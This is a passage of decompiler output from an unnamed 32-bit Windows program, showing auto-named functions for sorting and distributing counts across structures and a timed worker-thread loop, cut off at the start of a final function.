void __thiscall sub_470D0A(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5, unsigned int a6)
{
  unsigned int v6; // esi
  _DWORD *v7; // ebx
  unsigned int v8; // edi
  _DWORD *v9; // ecx
  int v10; // ecx
  unsigned int v11; // edi
  unsigned int v12; // ecx
  unsigned int v13; // edx
  int v14; // edi
  unsigned int v15; // eax
  int v16; // ecx
  int v17; // edx
  unsigned int v18; // eax
  unsigned int v19; // edi
  int v20; // eax
  int v22; // [esp+Ch] [ebp-18h]
  unsigned int v23; // [esp+10h] [ebp-14h]
  unsigned int v24; // [esp+10h] [ebp-14h]
  int v25; // [esp+14h] [ebp-10h]
  unsigned int v26; // [esp+18h] [ebp-Ch]
  unsigned int v27; // [esp+1Ch] [ebp-8h]
  char v28; // [esp+23h] [ebp-1h]

  v6 = a5;
  v7 = this;
  do
  {
    v8 = 0;
    v28 = 0;
    if ( !v6 )
      break;
    do
    {
      v9 = *(_DWORD **)(v7[23] + 4 * v8);
      if ( v9[1] )
      {
        if ( v9[10] > v9[11] )
        {
          v28 = 1;
          if ( sub_47195A(v7, &a3, &a4, v9, a6) )
            --a2;
        }
      }
      ++v8;
    }
    while ( v8 < v6 );
  }
  while ( v28 );
  v10 = a2;
  if ( a2 )
  {
    v11 = 0;
    v23 = 0;
    if ( v6 )
    {
      v25 = v7[23];
      while ( 1 )
      {
        v12 = v11 + 1;
        v27 = v11;
        v26 = v11 + 1;
        v13 = v11 + 1;
        if ( v11 + 1 < v6 )
        {
          v14 = 4 * v11;
          do
          {
            if ( *(_DWORD *)(*(_DWORD *)(v25 + 4 * v13) + 4) <= *(_DWORD *)(*(_DWORD *)(v14 + v25) + 4) )
            {
              v15 = v27;
            }
            else
            {
              v15 = v13;
              v27 = v13;
              v14 = 4 * v13;
            }
            ++v13;
          }
          while ( v13 < v6 );
          v11 = v23;
          v7 = this;
          if ( v23 != v15 )
          {
            v16 = this[23];
            v17 = *(_DWORD *)(v16 + 4 * v23);
            *(_DWORD *)(v16 + 4 * v23) = *(_DWORD *)(v16 + 4 * v15);
            *(_DWORD *)(this[23] + 4 * v27) = v17;
          }
          v12 = v26;
        }
        v25 = v7[23];
        if ( !*(_DWORD *)(*(_DWORD *)(v25 + 4 * v11) + 4) )
          break;
        v11 = v12;
        v23 = v12;
        if ( v12 >= v6 )
          goto LABEL_25;
      }
      v6 = v11;
LABEL_25:
      v10 = a2;
    }
    v18 = v6;
    v24 = v6;
    do
    {
      v19 = 0;
      if ( v18 )
      {
        do
        {
          v20 = *(_DWORD *)(v7[23] + 4 * v19);
          v22 = v20;
          if ( *(_DWORD *)(v20 + 4) )
          {
            v10 = a2 - sub_4714FA(v7, &a3, &a4, v20, v6, a6);
            a2 = v10;
            if ( !*(_DWORD *)(v22 + 4) )
              --v6;
          }
          v18 = v24;
          ++v19;
        }
        while ( v19 < v24 );
      }
    }
    while ( v10 );
  }
}

//----- (00470E47) --------------------------------------------------------
void __thiscall sub_470E47(_DWORD *this, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ebx
  _DWORD *v4; // edx
  int v5; // esi
  unsigned int v6; // edi
  _DWORD *v7; // edi
  unsigned int v8; // ecx
  int v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // edx
  int v12; // ebx
  unsigned int v13; // eax
  int v14; // ecx
  int v15; // edx
  int v16; // eax
  int v17; // edi
  int v18; // eax
  unsigned int v19; // eax
  int v20; // [esp+Ch] [ebp-1Ch]
  int v21; // [esp+10h] [ebp-18h]
  int v22; // [esp+10h] [ebp-18h]
  unsigned int v23; // [esp+10h] [ebp-18h]
  int v24; // [esp+14h] [ebp-14h]
  unsigned int v25; // [esp+18h] [ebp-10h]
  unsigned int v26; // [esp+18h] [ebp-10h]
  int v27; // [esp+1Ch] [ebp-Ch]
  unsigned int v28; // [esp+1Ch] [ebp-Ch]
  char v30; // [esp+27h] [ebp-1h]

  v3 = a2;
  v4 = this;
  v5 = a3;
  do
  {
    v6 = 0;
    v30 = 0;
    v25 = 0;
    if ( !a3 )
      break;
    do
    {
      if ( !v3 )
        break;
      v7 = *(_DWORD **)(v4[23] + 4 * v6);
      if ( v7[1] )
      {
        v8 = v7[11];
        if ( v7[10] > v8 )
        {
          v30 = 1;
          v27 = *(_DWORD *)(*(_DWORD *)(v7[4] + 20) + 4 * v8);
          v21 = *(_DWORD *)(v7[4] + 16) + 52 * v27;
          if ( *(_DWORD *)(40 * v27 + v4[18] + 28) )
          {
            sub_471212(v4, (_DWORD *)v7[4], v27, 1, 1);
            if ( *(_DWORD *)(v21 + 28) == *(_DWORD *)(v21 + 4) )
              ++v7[11];
            --v7[1];
            --v3;
            v4 = this;
          }
          else
          {
            ++v7[11];
          }
        }
      }
      v6 = v25 + 1;
      v25 = v6;
    }
    while ( v6 < a3 );
    a2 = v3;
  }
  while ( v30 );
  if ( v3 )
  {
    v9 = 0;
    v22 = 0;
    if ( a3 )
    {
      v24 = v4[23];
      while ( 1 )
      {
        v10 = v9 + 1;
        v28 = v9;
        v26 = v9 + 1;
        if ( v9 + 1 < a3 )
        {
          v11 = v9 + 1;
          v12 = 4 * v9;
          do
          {
            if ( *(_DWORD *)(*(_DWORD *)(v24 + 4 * v11) + 4) <= *(_DWORD *)(*(_DWORD *)(v12 + v24) + 4) )
            {
              v13 = v28;
            }
            else
            {
              v13 = v11;
              v28 = v11;
              v12 = 4 * v11;
            }
            ++v11;
          }
          while ( v11 < a3 );
          v9 = v22;
          v3 = a2;
          v4 = this;
          if ( v22 != v13 )
          {
            v14 = this[23];
            v15 = *(_DWORD *)(v14 + 4 * v22);
            *(_DWORD *)(v14 + 4 * v22) = *(_DWORD *)(v14 + 4 * v13);
            *(_DWORD *)(this[23] + 4 * v28) = v15;
            v4 = this;
          }
          v10 = v26;
        }
        v24 = v4[23];
        if ( !*(_DWORD *)(*(_DWORD *)(v24 + 4 * v9) + 4) )
          break;
        v9 = v10;
        v22 = v10;
        if ( v10 >= a3 )
          goto LABEL_29;
      }
      v5 = v9;
    }
LABEL_29:
    v16 = v5;
    v23 = v5;
    while ( 1 )
    {
      v17 = 0;
      if ( v16 )
        break;
LABEL_36:
      if ( !v3 )
        return;
    }
    while ( v3 )
    {
      v18 = *(_DWORD *)(v4[23] + 4 * v17);
      v20 = v18;
      if ( *(_DWORD *)(v18 + 4) )
      {
        v19 = sub_471840(v4, v3, v18, v5);
        v4 = this;
        v3 -= v19;
        if ( !*(_DWORD *)(v20 + 4) )
          --v5;
      }
      v16 = v23;
      if ( ++v17 >= v23 )
        goto LABEL_36;
    }
  }
}

//----- (00470FDA) --------------------------------------------------------
int __thiscall sub_470FDA(int *this)
{
  unsigned int v2; // ebx
  unsigned int v3; // esi
  unsigned int v4; // edx
  _DWORD *v5; // ecx
  int v6; // eax
  unsigned int v7; // esi
  unsigned int v8; // ebx
  unsigned int v9; // eax
  int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // ecx
  unsigned int v14; // edx
  int v15; // esi
  _DWORD *v16; // eax
  unsigned int v17; // edx
  int v18; // ebx
  _DWORD *v19; // ecx
  int v20; // esi
  unsigned int v21; // ecx
  unsigned int v22; // eax
  unsigned int v23; // edx
  unsigned int v24; // esi
  unsigned int v25; // ebx
  int v26; // ecx
  unsigned int v27; // esi
  unsigned int v28; // ecx
  unsigned int v29; // edx
  unsigned int v30; // esi
  unsigned int v31; // eax
  unsigned int v33; // [esp+Ch] [ebp-18h]
  unsigned int i; // [esp+10h] [ebp-14h]
  unsigned int v35; // [esp+14h] [ebp-10h]
  unsigned int v36; // [esp+14h] [ebp-10h]
  int v37; // [esp+18h] [ebp-Ch]
  unsigned int v38; // [esp+18h] [ebp-Ch]
  unsigned int v39; // [esp+1Ch] [ebp-8h]
  unsigned int v40; // [esp+20h] [ebp-4h]

  sub_47265C(this);
  sub_47276F(this);
  v2 = 0;
  v3 = 0;
  v4 = 0;
  v39 = 0;
  for ( i = 0; v4 < this[2]; ++v4 )
  {
    v5 = *(_DWORD **)(this[21] + 4 * v4);
    if ( *(_DWORD *)(v5[4] + 160) > v5[9] )
    {
      *(_DWORD *)(this[22] + 4 * v3) = v5;
      v6 = v5[4];
      i = v3 + 1;
      v7 = *(_DWORD *)(v6 + 160) - v5[9];
      v39 = v7 + v2;
      if ( v5[6] < v7 )
        v7 = v5[6];
      v5[10] = v7;
      v8 = *(_DWORD *)(v6 + 168) - v5[6];
      v9 = *(_DWORD *)(v6 + 160) - v5[9] - v7;
      if ( v8 >= v9 )
        v8 = v9;
      v10 = v5[4];
      v5[11] = v8;
      v11 = *(_DWORD *)(v10 + 160) - v5[9] - v8;
      v2 = v39;
      v12 = v11 - v7;
      v3 = i;
      v5[12] = v12;
    }
  }
  v13 = 0;
  v14 = 0;
  this[8] = 0;
  v40 = 0;
  v35 = 0;
  if ( this[6] )
  {
    v15 = 0;
    v37 = 0;
    do
    {
      v16 = (_DWORD *)(v15 + this[18]);
      if ( v16[1] )
      {
        v17 = 0;
        v18 = 0;
        do
        {
          v19 = (_DWORD *)(v18 + v16[8]);
          v20 = v19[4];
          if ( v20 )
          {
            if ( v20 == v19[7] )
            {
              *v19 = 6;
              ++v16[7];
              ++this[8];
            }
            v13 = v40;
          }
          else
          {
            *v19 = 2;
            ++v16[2];
            v13 = ++v40;
          }
          ++v17;
          v18 += 36;
        }
        while ( v17 < v16[1] );
        v14 = v35;
        v15 = v37;
      }
      ++v14;
      v15 += 40;
      v35 = v14;
      v37 = v15;
    }
    while ( v14 < this[6] );
  }
  v21 = v39 + v13;
  this[9] = 0;
  v22 = 0;
  v36 = v21;
  while ( (v21 || this[8]) && v22 < 2 )
  {
    if ( v22 == 1 )
      sub_471FB3(this);
    v23 = 0;
    v24 = 0;
    v25 = 0;
    if ( this[2] )
    {
      do
      {
        v26 = *(_DWORD *)(this[21] + 4 * v23);
        if ( *(_DWORD *)(*(_DWORD *)(v26 + 16) + 160) < *(_DWORD *)(v26 + 36) )
        {
          *(_DWORD *)(this[23] + 4 * v24++) = v26;
          v25 += *(_DWORD *)(v26 + 36) - *(_DWORD *)(*(_DWORD *)(v26 + 16) + 160);
        }
        ++v23;
      }
      while ( v23 < this[2] );
      v38 = v24;
      if ( v24 )
      {
        if ( v36 )
        {
          v27 = sub_4700B0(this, v36, v25, v24);
          v33 = sub_472865(this, v38);
          v28 = 0;
          v29 = v40;
          if ( v40 >= v27 )
            v29 = v27;
          v40 -= v29;
          if ( v29 < v27 )
          {
            v28 = v27 - v29;
            if ( v27 - v29 >= v39 )
              v28 = v39;
            v39 -= v28;
          }
          sub_470D0A(this, v27, v29, v28, v33, i);
          v36 -= v27;
          v25 -= v27;
          v24 = v38;
        }
        if ( v25 )
        {
          if ( this[8] )
          {
            v30 = sub_4700B0(this, this[8], v25, v24);
            v31 = sub_472865(this, v38);
            sub_470E47(this, v30, v31);
            this[8] -= v30;
          }
        }
      }
    }
    v22 = ++this[9];
    v21 = v36;
  }
  return sub_47345E(this);
}

//----- (00471212) --------------------------------------------------------
void __thiscall sub_471212(_DWORD *this, _DWORD *a2, int a3, int a4, char a5)
{
  int v5; // edx
  int v6; // edi
  _DWORD *v7; // esi
  int i; // ecx
  _DWORD *v9; // eax
  int v10; // [esp+Ch] [ebp-4h]

  v5 = a3;
  v6 = 0;
  v7 = (_DWORD *)(this[18] + 40 * a3);
  for ( i = 0; ; i += 36 )
  {
    v9 = (_DWORD *)(i + v7[8]);
    v10 = i;
    if ( *v9 == 2 && !a5 )
      break;
    if ( *v9 == 6 && a5 )
      break;
LABEL_11:
    ++v6;
  }
  ++v9[4];
  *v9 = 0;
  if ( a5 )
    --v7[7];
  else
    --v7[2];
  sub_47A934(a2, a2[4] + 52 * v5, v6, a5);
  if ( --a4 )
  {
    i = v10;
    v5 = a3;
    goto LABEL_11;
  }
}

//----- (0047127F) --------------------------------------------------------
void __thiscall sub_47127F(_DWORD *this, _DWORD *a2, _DWORD *a3, int a4, unsigned int a5)
{
  _DWORD *v5; // ebx
  unsigned int v6; // edx
  unsigned int v7; // esi
  unsigned int v8; // edi
  unsigned int v9; // ecx
  unsigned int v10; // eax
  unsigned int v11; // esi
  unsigned int v12; // esi
  int v13; // edx
  char v14; // bh
  char v15; // bl
  _DWORD *v16; // [esp+10h] [ebp-28h]
  int v17; // [esp+14h] [ebp-24h]
  char v18; // [esp+18h] [ebp-20h]
  int v20; // [esp+20h] [ebp-18h]
  int i; // [esp+24h] [ebp-14h]
  unsigned int v22; // [esp+28h] [ebp-10h]
  int v23; // [esp+2Ch] [ebp-Ch]
  int v24; // [esp+30h] [ebp-8h]
  unsigned int v25; // [esp+34h] [ebp-4h]

  v5 = (_DWORD *)(52 * a4 + *(_DWORD *)(a2[4] + 16));
  v16 = (_DWORD *)a2[4];
  v24 = (int)v5;
  v6 = v5[11];
  if ( a5 >= v6 )
  {
    v7 = v5[11];
    v25 = v7;
  }
  else
  {
    v7 = a5;
    v25 = a5;
  }
  v8 = a5 - v7;
  if ( a5 - v7 >= v5[8] - v6 )
    v8 = v5[8] - v6;
  v9 = v25;
  v10 = v5[10] - v6;
  v11 = a5 - v8 - v25;
  v22 = v10;
  if ( v11 < v10 )
  {
    v10 = a5 - v8 - v25;
    v22 = v10;
  }
  v12 = v11 - v10;
  v23 = 0;
  v20 = 0;
  for ( i = 0; ; i += 52 )
  {
    v13 = i + v5[12];
    v17 = v13;
    if ( *(_DWORD *)v13 == 4 && !*(_DWORD *)(v13 + 40) )
      break;
LABEL_32:
    ++v23;
    v20 += 36;
  }
  v14 = *(_BYTE *)(v13 + 49);
  v15 = *(_BYTE *)(v13 + 48);
  if ( v14 )
  {
    if ( v15 && v9 )
    {
      v25 = v9 - 1;
      goto LABEL_22;
    }
    if ( v8 )
    {
      --v8;
      goto LABEL_22;
    }
LABEL_31:
    v5 = (_DWORD *)v24;
    goto LABEL_32;
  }
  if ( v15 && v10 )
  {
    v22 = v10 - 1;
    goto LABEL_22;
  }
  if ( !v12 )
    goto LABEL_31;
  --v12;
LABEL_22:
  if ( v15 )
  {
    sub_473B4C(
      this,
      v24,
      v13,
      (_DWORD *)(this[18] + 40 * a4),
      (_DWORD *)(v20 + *(_DWORD *)(this[18] + 40 * a4 + 32)),
      (int)a2);
    v14 = *(_BYTE *)(v17 + 49);
  }
  v18 = 0;
  if ( v14 )
  {
    v18 = 1;
    if ( v15 )
      --a2[10];
    else
      --a2[11];
  }
  else
  {
    --a2[12];
  }
  v5 = (_DWORD *)v24;
  sub_47B568(v16, v24, v23);
  sub_47A934(a3, 52 * a4 + a3[4], v23, v18);
  if ( --a5 )
  {
    v10 = v22;
    v9 = v25;
    goto LABEL_32;
  }
}

//----- (004713E1) --------------------------------------------------------
int __stdcall sub_4713E1(int a1)
{
  sub_4713FA(a1);
  sub_46FA2C(0);
  return 0;
}

//----- (004713FA) --------------------------------------------------------
void __thiscall sub_4713FA(int this)
{
  DWORD v2; // ebx
  struct _RTL_CRITICAL_SECTION *i; // esi
  int v4; // eax
  unsigned int v5; // esi
  DWORD v6; // [esp+14h] [ebp-18h]
  int TickCount64; // [esp+1Ch] [ebp-10h]

  v2 = 100;
  TickCount64 = j____crtGetTickCount64() - 500;
  if ( *(_DWORD *)(this + 40) != 2 )
  {
    for ( i = (struct _RTL_CRITICAL_SECTION *)(this + 44); ; i = (struct _RTL_CRITICAL_SECTION *)(this + 44) )
    {
      v6 = WaitForSingleObjectEx(*(HANDLE *)(this + 80), v2, 0);
      sub_46F04D(i);
      v4 = *(_DWORD *)(this + 40);
      if ( v4 )
      {
        if ( v4 != 1 )
          goto LABEL_17;
        if ( v6 == 258 )
        {
          sub_470FDA((int *)this);
LABEL_10:
          if ( *(_DWORD *)(this + 16) )
            sub_47377A((_DWORD *)this, 0);
          goto LABEL_12;
        }
        v5 = j____crtGetTickCount64() - TickCount64;
        if ( v5 > 0x64 )
        {
          if ( v5 <= 0x82 )
            goto LABEL_10;
          sub_470B06((_DWORD *)this);
LABEL_12:
          TickCount64 = j____crtGetTickCount64();
          v2 = 100;
          goto LABEL_17;
        }
        if ( *(_DWORD *)(this + 16) )
          sub_47377A((_DWORD *)this, 0);
        v2 = 100 - v5;
      }
      else
      {
        v2 = sub_470B71((_DWORD *)this) ? -1 : 100;
      }
LABEL_17:
      sub_46F193((LPCRITICAL_SECTION)(this + 44));
      if ( *(_DWORD *)(this + 40) == 2 )
        return;
    }
  }
}
// 46F7CA: using guessed type __int64 j____crtGetTickCount64(void);

//----- (004714FA) --------------------------------------------------------
unsigned int __thiscall sub_4714FA(_DWORD *this, unsigned int *a2, unsigned int *a3, int a4, int a5, unsigned int a6)
{
  int v7; // ecx
  int v8; // esi
  unsigned int v9; // ebx
  unsigned int v10; // eax
  int v11; // eax
  int v12; // edx
  unsigned int v13; // edi
  unsigned int v14; // edx
  unsigned int v15; // eax
  unsigned int *v16; // eax
  unsigned int v17; // esi
  int v18; // ecx
  _DWORD *v19; // esi
  int v20; // edx
  int v21; // eax
  unsigned int v22; // edx
  unsigned int v23; // edx
  int v24; // eax
  unsigned int v25; // edx
  unsigned int v26; // eax
  bool v27; // cf
  unsigned int v28; // eax
  bool v29; // zf
  int v30; // edx
  unsigned int v31; // eax
  unsigned int v32; // esi
  unsigned int v33; // eax
  unsigned int v34; // ecx
  unsigned int *v35; // eax
  unsigned int v36; // esi
  _DWORD *v37; // edx
  _DWORD *v38; // ecx
  int v39; // eax
  int v40; // ebx
  unsigned int v41; // ecx
  unsigned int v42; // eax
  unsigned int v43; // eax
  unsigned int v44; // ecx
  int v45; // edx
  int v46; // ecx
  char v47; // al
  _DWORD *v49; // [esp+Ch] [ebp-54h]
  unsigned int v50; // [esp+10h] [ebp-50h]
  int v51; // [esp+14h] [ebp-4Ch]
  int v52; // [esp+18h] [ebp-48h]
  unsigned int v53; // [esp+20h] [ebp-40h]
  unsigned int v54; // [esp+24h] [ebp-3Ch]
  int v55; // [esp+28h] [ebp-38h]
  unsigned int v56; // [esp+28h] [ebp-38h]
  unsigned int v57; // [esp+28h] [ebp-38h]
  int v58; // [esp+2Ch] [ebp-34h]
  int v59; // [esp+30h] [ebp-30h]
  int v60; // [esp+30h] [ebp-30h]
  unsigned int v61; // [esp+34h] [ebp-2Ch]
  unsigned int v62; // [esp+38h] [ebp-28h]
  unsigned int v63; // [esp+3Ch] [ebp-24h]
  int v64; // [esp+40h] [ebp-20h]
  int v65; // [esp+44h] [ebp-1Ch]
  unsigned int v66; // [esp+48h] [ebp-18h]
  unsigned int v67; // [esp+4Ch] [ebp-14h]
  int v68; // [esp+50h] [ebp-10h]
  _DWORD *v69; // [esp+54h] [ebp-Ch]
  int v70; // [esp+58h] [ebp-8h]
  char v71; // [esp+5Fh] [ebp-1h]

  v7 = a4;
  v69 = this;
  v49 = *(_DWORD **)(a4 + 16);
  v8 = v49[5];
  v65 = v49[4];
  v9 = 0;
  v68 = v8;
  v54 = 0;
  if ( a5 == 1 )
    v71 = 0;
  else
    v71 = *(_BYTE *)(a4 + 32);
  v10 = *(_DWORD *)(a4 + 44);
  v53 = 0;
  v58 = -1;
  v66 = 0;
  v61 = 0;
  v59 = v10;
  v50 = this[6];
  if ( v10 >= v50 )
    goto LABEL_79;
  do
  {
    v11 = *(_DWORD *)(v8 + 4 * v10);
    v12 = 52 * v11;
    v55 = 52 * v11;
    v13 = v66;
    if ( *(_DWORD *)(52 * v11 + v65 + 28) )
      goto LABEL_40;
    v62 = *(_DWORD *)(v7 + 4);
    if ( v62 >= *(_DWORD *)(v12 + v65 + 4) )
      v62 = *(_DWORD *)(v12 + v65 + 4);
    v14 = 0;
    v13 = v66;
    v63 = 0;
    v70 = 0;
    if ( *a2 )
    {
      v15 = *(_DWORD *)(40 * v11 + v69[18] + 8);
      if ( v15 )
      {
        if ( *a2 < v15 )
          v15 = *a2;
        v63 = v15;
        v14 = 1;
        v70 = 1;
      }
      v7 = a4;
    }
    v16 = a3;
    v17 = 0;
    v67 = 0;
    if ( *a3 )
    {
      v64 = 0;
      if ( a6 )
      {
        v18 = v55;
        while ( 1 )
        {
          if ( v17 >= *v16 )
          {
LABEL_33:
            v13 = v66;
            v9 = 0;
            v7 = a4;
            break;
          }
          v19 = *(_DWORD **)(v69[22] + 4 * v64);
          v20 = v19[4];
          if ( *(_DWORD *)(v20 + 160) > v19[9]
            && (v21 = *(_DWORD *)(v20 + 16), (v52 = *(_DWORD *)(v18 + v21 + 28) - *(_DWORD *)(v18 + v21 + 36)) != 0) )
          {
            v22 = *(_DWORD *)(v18 + v21 + 44);
            v56 = v19[10];
            if ( v22 < v56 )
              v56 = *(_DWORD *)(v18 + v21 + 44);
            v51 = *(_DWORD *)(v18 + v21 + 32);
            v23 = v51 - v22;
            if ( v23 >= v19[11] )
              v23 = v19[11];
            v24 = v52 - v51;
            if ( (unsigned int)(v52 - v51) >= v19[12] )
              v24 = v19[12];
            v17 = v67;
            v25 = v56 + v24 + v23;
            if ( v25 )
            {
              v26 = *a3 - v67;
              if ( v26 >= v25 )
                v26 = v25;
              v17 = v26 + v67;
              v14 = v70 + 1;
              v67 += v26;
              ++v70;
              goto LABEL_32;
            }
          }
          else
          {
            v17 = v67;
          }
          v14 = v70;
LABEL_32:
          v27 = ++v64 < a6;
          v16 = a3;
          if ( !v27 )
            goto LABEL_33;
        }
      }
    }
    v28 = v17 + v63;
    if ( v71 )
    {
      v29 = v28 == v62;
LABEL_36:
      if ( !v29 || v14 <= v61 )
        goto LABEL_39;
      goto LABEL_38;
    }
    if ( v13 >= v62 || v28 <= v13 )
    {
      v29 = v28 == v13;
      goto LABEL_36;
    }
LABEL_38:
    v58 = v59;
    v13 = v17 + v63;
    v66 = v17 + v63;
    v61 = v14;
LABEL_39:
    v8 = v49[5];
LABEL_40:
    v10 = v59 + 1;
    v59 = v10;
  }
  while ( v10 < v50 );
  if ( v58 == -1 )
  {
LABEL_79:
    v47 = 0;
    goto LABEL_80;
  }
  v30 = *(_DWORD *)(v8 + 4 * v58);
  v31 = *(_DWORD *)(v7 + 4);
  v60 = v30;
  if ( v31 < v13 )
    v13 = *(_DWORD *)(v7 + 4);
  *(_DWORD *)(v7 + 4) = v31 - v13;
  v53 = v13;
  v32 = *a2;
  if ( *a2 )
  {
    v33 = *(_DWORD *)(40 * v30 + v69[18] + 8);
    if ( v33 )
    {
      v34 = *a2;
      if ( v32 >= v33 )
        v34 = *(_DWORD *)(40 * v30 + v69[18] + 8);
      if ( v34 >= v13 )
      {
        v32 = v13;
      }
      else if ( v32 >= v33 )
      {
        v32 = *(_DWORD *)(40 * v30 + v69[18] + 8);
      }
      sub_471212(v69, v49, v30, v32, 0);
      *a2 -= v32;
      v13 -= v32;
    }
  }
  if ( v13 )
  {
    v35 = a3;
    if ( *a3 )
    {
      do
      {
        if ( v9 >= a6 )
          break;
        v36 = *v35;
        if ( !*v35 )
          break;
        v37 = *(_DWORD **)(v69[22] + 4 * v9);
        if ( *(_DWORD *)(v37[4] + 160) <= v37[9] )
          goto LABEL_76;
        v38 = (_DWORD *)(*(_DWORD *)(v37[4] + 16) + 52 * v60);
        v39 = v38[7] - v38[9];
        if ( !v39 )
          goto LABEL_76;
        v57 = v37[10];
        if ( v38[11] < v57 )
          v57 = v38[11];
        v40 = v38[8];
        v41 = v40 - v38[11];
        if ( v41 >= v37[11] )
          v41 = v37[11];
        v42 = v39 - v40;
        if ( v42 >= v37[12] )
          v42 = v37[12];
        v9 = v54;
        v43 = v57 + v41 + v42;
        if ( v43 )
        {
          v44 = v36;
          if ( v36 >= v43 )
            v44 = v43;
          if ( v44 >= v13 )
          {
            v36 = v13;
          }
          else if ( v36 >= v43 )
          {
            v36 = v43;
          }
          sub_47127F(v69, v37, *(_DWORD **)(a4 + 16), v60, v36);
          v35 = a3;
          *a3 -= v36;
          v13 -= v36;
        }
        else
        {
LABEL_76:
          v35 = a3;
        }
        v54 = ++v9;
      }
      while ( v13 );
    }
  }
  v45 = *(_DWORD *)(a4 + 44);
  v46 = *(_DWORD *)(v68 + 4 * v45);
  *(_DWORD *)(v68 + 4 * v45) = *(_DWORD *)(v68 + 4 * v58);
  *(_DWORD *)(v68 + 4 * v58) = v46;
  v7 = a4;
  ++*(_DWORD *)(a4 + 44);
  v47 = 1;
LABEL_80:
  *(_BYTE *)(v7 + 32) = v47;
  return v53;
}

//----- (00471840) --------------------------------------------------------
unsigned int __thiscall sub_471840(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v4; // ebx
  int v5; // eax
  int v6; // edi
  unsigned int v7; // eax
  int v8; // ecx
  unsigned int v9; // eax
  int v10; // edx
  int v11; // ecx
  char v12; // al
  unsigned int v14; // [esp+Ch] [ebp-28h]
  int v15; // [esp+10h] [ebp-24h]
  int v16; // [esp+14h] [ebp-20h]
  int v17; // [esp+18h] [ebp-1Ch]
  unsigned int v18; // [esp+1Ch] [ebp-18h]
  unsigned int v20; // [esp+24h] [ebp-10h]
  int v21; // [esp+28h] [ebp-Ch]
  int v22; // [esp+2Ch] [ebp-8h]
  char v23; // [esp+33h] [ebp-1h]

  v4 = 0;
  v5 = *(_DWORD *)(a3 + 16);
  v6 = *(_DWORD *)(v5 + 20);
  v17 = *(_DWORD *)(v5 + 16);
  if ( a4 == 1 )
    v23 = 0;
  else
    v23 = *(_BYTE *)(a3 + 32);
  v7 = *(_DWORD *)(a3 + 44);
  v22 = -1;
  v20 = 0;
  v21 = v7;
  v14 = this[6];
  v8 = -1;
  if ( v7 >= this[6] )
  {
LABEL_25:
    v12 = 0;
    goto LABEL_26;
  }
  do
  {
    v15 = *(_DWORD *)(v6 + 4 * v7);
    v16 = v17 + 52 * v15;
    if ( *(_DWORD *)(v16 + 28) )
      goto LABEL_16;
    v18 = *(_DWORD *)(a3 + 4);
    if ( v18 >= *(_DWORD *)(v16 + 4) )
      v18 = *(_DWORD *)(v16 + 4);
    v9 = *(_DWORD *)(40 * v15 + this[18] + 28);
    if ( v9 )
    {
      if ( a2 < v9 )
        v9 = a2;
    }
    else
    {
      v9 = 0;
    }
    if ( v23 )
    {
      if ( v9 == v18 )
        goto LABEL_23;
    }
    else if ( v9 > v20 )
    {
LABEL_23:
      v8 = v21;
      v22 = v21;
      v20 = v9;
      if ( v23 )
        goto LABEL_18;
      goto LABEL_15;
    }
    v8 = v22;
LABEL_15:
    v7 = v21;
LABEL_16:
    v21 = ++v7;
  }
  while ( v7 < v14 );
  v9 = v20;
LABEL_18:
  if ( v8 == -1 )
    goto LABEL_25;
  v4 = *(_DWORD *)(a3 + 4);
  if ( v4 >= v9 )
    v4 = v9;
  sub_471212(this, *(_DWORD **)(a3 + 16), *(_DWORD *)(v6 + 4 * v8), v4, 1);
  v10 = *(_DWORD *)(a3 + 44);
  *(_DWORD *)(a3 + 4) -= v4;
  v11 = *(_DWORD *)(v6 + 4 * v10);
  *(_DWORD *)(v6 + 4 * v10) = *(_DWORD *)(v6 + 4 * v22);
  *(_DWORD *)(v6 + 4 * v22) = v11;
  ++*(_DWORD *)(a3 + 44);
  v12 = 1;
LABEL_26:
  *(_BYTE *)(a3 + 32) = v12;
  return v4;
}

//----- (0047195A) --------------------------------------------------------
char __thiscall sub_47195A(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5)
{
  char v5; // bl
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // edx
  int v9; // edi
  unsigned int v10; // ecx
  _DWORD *v11; // ecx
  int v12; // edx
  int v14; // [esp+Ch] [ebp-10h]
  unsigned int v15; // [esp+10h] [ebp-Ch]
  int v16; // [esp+14h] [ebp-8h]

  v5 = 0;
  v6 = a4[4];
  v14 = *(_DWORD *)(v6 + 16);
  v7 = *(_DWORD *)(*(_DWORD *)(v6 + 20) + 4 * a4[11]);
  v8 = this;
  v9 = 52 * v7;
  v16 = v7;
  if ( *a2 && *(_DWORD *)(40 * v7 + this[18] + 8) )
  {
    v5 = 1;
    sub_471212(this, (_DWORD *)a4[4], v7, 1, 0);
    --*a2;
  }
  else
  {
    if ( !*a3 || (v10 = 0, v15 = 0, !a5) )
    {
LABEL_20:
      ++a4[11];
      return v5;
    }
    while ( !v5 )
    {
      v11 = *(_DWORD **)(v8[22] + 4 * v10);
      if ( *(_DWORD *)(v11[4] + 160) > v11[9] )
      {
        v12 = *(_DWORD *)(v11[4] + 16);
        if ( *(_DWORD *)(v9 + v12 + 44)
          || *(_DWORD *)(v9 + v12 + 32) != *(_DWORD *)(v9 + v12 + 44) && v11[11]
          || *(_DWORD *)(v9 + v12 + 28) != *(_DWORD *)(v9 + v12 + 36) && v11[12] )
        {
          v5 = 1;
          sub_47127F(this, v11, (_DWORD *)a4[4], v16, 1u);
          --*a3;
        }
        v8 = this;
      }
      v10 = v15 + 1;
      v15 = v10;
      if ( v10 >= a5 )
      {
        if ( !v5 )
          goto LABEL_20;
        break;
      }
    }
  }
  if ( *(_DWORD *)(v9 + v14 + 28) == *(_DWORD *)(v9 + v14 + 4) )
    ++a4[11];
  --a4[1];
  return v5;
}

//----- (00471A63) --------------------------------------------------------
int __thiscall sub_471A63(_DWORD *this, __int16 a2)
{
  unsigned __int16 v2; // si
  unsigned __int16 v3; // dx
  int v4; // ecx
  int result; // eax

  v2 = *(_WORD *)this;
  v3 = 0;
  if ( !*(_WORD *)this )
    return 0;
  v4 = this[1];
  while ( 1 )
  {
    result = v4 + 12 * v3;
    if ( *(_WORD *)(result + 4) == a2 )
      break;
    if ( ++v3 >= v2 )
      return 0;
  }
  return result;
}

//----- (00471A97) --------------------------------------------------------
_BYTE *__thiscall sub_471A97(_DWORD *this)
{
  _BYTE *result; // eax
  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF

